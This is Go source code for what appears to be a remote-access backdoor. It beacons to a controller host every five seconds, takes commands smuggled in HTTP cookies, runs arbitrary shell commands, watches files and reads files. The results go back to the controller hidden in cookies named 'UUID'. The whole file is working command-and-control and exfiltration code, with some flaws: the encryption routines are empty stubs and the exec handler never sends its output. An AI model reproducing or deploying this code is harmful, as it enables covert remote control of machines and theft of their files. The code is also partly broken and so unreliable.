package main

import (
	"fmt"
	"golang.org/x/exp/inotify"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	EXEC  byte = 1
	WATCH byte = 2
	GET   byte = 3
)

var (
	chunkSize = 1024
)

func serverWorker(clientIp string) {

	fmt.Printf("Got connection from %v\n", clientIp)

	results := make(chan string)

	client := &http.Client{}

	//resp, err := client.Get(clientIp.String())

	ticker := time.NewTicker(time.Second * 5)
	for _ = range ticker.C {

		//read from the response buffer
		request, err := http.NewRequest("GET", "http://"+clientIp+":8000", nil)
		if err != nil {
			panic(err)
		}

		request.Close = true

		// use select to avoid infinetly blocking on <-results
		select {
		case resultData, ok := <-results:

			if !ok {
				return
			}
			var myCookie http.Cookie
			myCookie.Name = "UUID"
			myCookie.Value = resultData
			myCookie.MaxAge = 15
			myCookie.Secure = false
			myCookie.HttpOnly = false

			//encode data into a response cookie

			request.AddCookie(&myCookie)
			fmt.Printf("Adding cookie: \"%v\"\n", resultData)
		default:
		}

		//send http request to "server"
		response, err := client.Do(request)
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		//get response
		cookies := response.Cookies()
		//see if there is a command within the cookie returned
		if len(cookies) == 0 {
			continue
		}
		//if cookie, exec a command worker with said command

		for _, setCookie := range cookies {
			go runCommand(setCookie.Value, results)
		}

	}
}

func runCommand(data string, results chan<- string) {

	command := decrypt(data)

	switch command[0] {
	case EXEC:
		runExec(command[1:], results)

	case WATCH:
		runWatch(command[1:], results)

	case GET:
		runGet(command[1:], results)
	}

	//chdir

	//watch

	//getFile

}

func sendChunks(command, seq byte, data []byte, results chan<- string) {

	buf := make([]byte, 0, chunkSize)
	buf = append(buf, command, seq)

	for i := 0; i < len(data); i = i + chunkSize {
		buf = buf[:2]
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		buf = append(buf, data[i:end]...)
		results <- encrypt(buf)
	}

}

func runExec(command []byte, results chan<- string) {

	// get sequence number
	seq := command[0]

	// cast data section into chuncks of strings
	commandParts := strings.Split(string(command[1:]), " ")

	// create exec
	cmd := exec.Command(commandParts[0], commandParts[1:]...)

	// run exec and get output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return
	}

	// prepare a buffer for encoding the output
	result := make([]byte, 0, len(output)+2)
	result = append(result, 1, seq)
	sendChunks(EXEC, seq, result, results)
}

func runWatch(command []byte, results chan<- string) {

	// get seq number
	seq := command[0]

	// cast the data into a file string
	path := string(command[1:])

	// create watcher
	watcher, err := inotify.NewWatcher()
	if err != nil {
		return
	}

	// set watch going
	err = watcher.Watch(path)
	if err != nil {
		return
	}

	// create result header with type and seq
	resultHeader := make([]byte, 0, 1)
	resultHeader = append(resultHeader, WATCH, seq)

	// wait on watch or error events from the watcher
	select {
	case ev := <-watcher.Event:
		result := append(resultHeader, []byte(ev.String())...)
		sendChunks(WATCH, seq, result, results)

	case err = <-watcher.Error:
		return
	}
}

func runGet(command []byte, results chan<- string) {

	// get seq number
	seq := command[0]

	// cast the data to a path
	path := string(command[1:])

	// attempt to open file
	file, err := os.Open(path)
	if err != nil {
		return
	}
	defer file.Close()

	buf := make([]byte, 0, chunkSize+2)
	buf = append(buf, GET, seq)

	for {
		n, err := file.Read(buf[2:])
		if n == 0 {
			break
		}
		results <- encrypt(buf[:n+2])
		if err == io.EOF {
			break
		}
	}

}

func encrypt(data []byte) string {
	//TODO
	return string(data)
}

func decrypt(data string) []byte {
	//TODO
	return []byte(data)
}
